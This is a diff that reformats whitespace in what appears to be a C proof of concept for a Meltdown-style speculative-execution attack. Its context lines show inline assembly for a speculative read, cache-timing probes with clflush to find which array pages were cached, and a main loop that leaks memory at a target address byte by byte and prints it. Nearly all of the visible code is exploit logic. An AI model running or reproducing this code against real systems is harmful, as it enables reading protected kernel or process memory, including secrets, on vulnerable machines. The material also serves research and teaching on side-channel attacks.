@@ -40,8 +40,7 @@ static void speculate(unsigned long addr) {
 		"stopspeculate: \n\t"
 		"nop\n\t"
 		:
-	: "r" (addr),
-		"r" (target_array)
+	: "r" (addr), "r" (target_array)
 		: "rax", "rbx"
 		);
 }
@@ -52,10 +51,10 @@ int attackonebyte(int fd, unsigned long addr)
 	int i, max = -1, max_i = 0, j, k;
 	static char buf[256];
 	memset(check_array, 0, sizeof(check_array));
-	for (i = 0; i < 1000; i++) 
+	for (i = 0; i < 1000; i++)
 	{
 		max_i = pread(fd, buf, sizeof(buf), 0);
-		if (max_i < 0) 
+		if (max_i < 0)
 		{
 			perror("pread");
 			break;
@@ -66,7 +65,7 @@ int attackonebyte(int fd, unsigned long addr)
 		int time;
 		/*检查target数组中那些项进入了缓存*/
 		volatile char *addr;
-		for (j = 0; j <ARRAY_SIZE; j++) 
+		for (j = 0; j <ARRAY_SIZE; j++)
 		{
 			addr = &target_array[j * PAGE_SIZE];
 			time = get_access_time(addr);
@@ -74,9 +73,9 @@ int attackonebyte(int fd, unsigned long addr)
 				check_array[j]++;
 		}
 	}
-	for (i = 0; i < ARRAY_SIZE; i++) 
+	for (i = 0; i < ARRAY_SIZE; i++)
 	{
-		if (check_array[i]&&check_array[i] > max) 
+		if (check_array[i] && check_array[i] > max)
 		{
 			max = check_array[i];
 			max_i = i;
@@ -108,7 +107,7 @@ void set_cached_threshold(void)
 {
 	long cached, uncached;
 	int i;
-	for (uncached = 0, i = 0; i < 10000; i++) 
+	for (uncached = 0, i = 0; i < 10000; i++)
 	{
 		_mm_clflush(target_array);
 		uncached += get_access_time(target_array);
@@ -137,7 +136,7 @@ int main(int argc, char *argv[])
 	for (i = 0; i < size; i++)
 	{
 		memset(attemp, 0, sizeof(attemp));
-		max = -1; max_i = 0; 
+		max = -1; max_i = 0;
 		for (j = 0; j<ATTEMP; j++)
 		{
 			ret = attackonebyte(fd, addr);
@@ -148,7 +147,7 @@ int main(int argc, char *argv[])
 		}
 		for (j = 1; j < ARRAY_SIZE; j++)
 		{
-			if (attemp[j]&&attemp[j] > max)
+			if (attemp[j] && attemp[j] > max)
 			{
 				max = attemp[j];
 				max_i = j;
@@ -157,8 +156,8 @@ int main(int argc, char *argv[])
 		ret = max_i;
 		printf("read:%lx data=%2x %c", addr, ret, isprint(ret) ? ret : ' ');
 #if MOREINFO
-		if(max==-1)
-		max=ATTEMP;
+		if (max == -1)
+			max = ATTEMP;
 		printf("  %din%d", max, ATTEMP);
 #endif
 		printf("\n");
@@ -166,8 +165,8 @@ int main(int argc, char *argv[])
 		addr++;
 	}
 	printf("ALL information:\n");
-	for(i=0;i<250&&i<size;i++)
-		printf("%c",isprint(record[i]) ? record[i] : ' ');
+	for (i = 0; i<250 && i<size; i++)
+		printf("%c", isprint(record[i]) ? record[i] : ' ');
 	printf("\n");
 	close(fd);
 	return 0;
